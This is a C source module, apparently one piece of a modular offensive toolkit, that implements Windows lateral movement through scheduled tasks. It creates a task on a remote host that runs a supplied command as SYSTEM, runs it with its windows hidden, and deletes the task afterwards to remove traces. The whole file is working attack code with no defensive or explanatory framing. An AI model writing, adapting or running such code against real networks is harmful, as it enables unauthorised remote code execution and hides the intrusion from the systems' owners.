// chunk: lateral/schtasks_exec
// depends: (none)
// provides: lateral_schtasks
// headers: windows.h
// note: Remote command execution via scheduled task

#ifndef CHUNK_LATERAL_SCHTASKS_EXEC
#define CHUNK_LATERAL_SCHTASKS_EXEC

static int lateral_schtasks(const char *target_host, const char *command,
                            const char *task_name) {
    char schtasks_cmd[2048];

    snprintf(schtasks_cmd, sizeof(schtasks_cmd),
             "schtasks /create /s %s /tn \"%s\" /tr \"%s\" /sc once /st 00:00 /f /ru SYSTEM",
             target_host, task_name, command);

    STARTUPINFOA si = {0};
    PROCESS_INFORMATION pi = {0};
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;

    if (!CreateProcessA(NULL, schtasks_cmd, NULL, NULL, FALSE,
                        CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        return 0;
    }
    WaitForSingleObject(pi.hProcess, 10000);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);

    snprintf(schtasks_cmd, sizeof(schtasks_cmd),
             "schtasks /run /s %s /tn \"%s\"", target_host, task_name);

    if (!CreateProcessA(NULL, schtasks_cmd, NULL, NULL, FALSE,
                        CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        return 0;
    }
    WaitForSingleObject(pi.hProcess, 10000);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);

    Sleep(2000);

    snprintf(schtasks_cmd, sizeof(schtasks_cmd),
             "schtasks /delete /s %s /tn \"%s\" /f", target_host, task_name);

    if (CreateProcessA(NULL, schtasks_cmd, NULL, NULL, FALSE,
                       CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        WaitForSingleObject(pi.hProcess, 5000);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    }

    return 1;
}

#endif
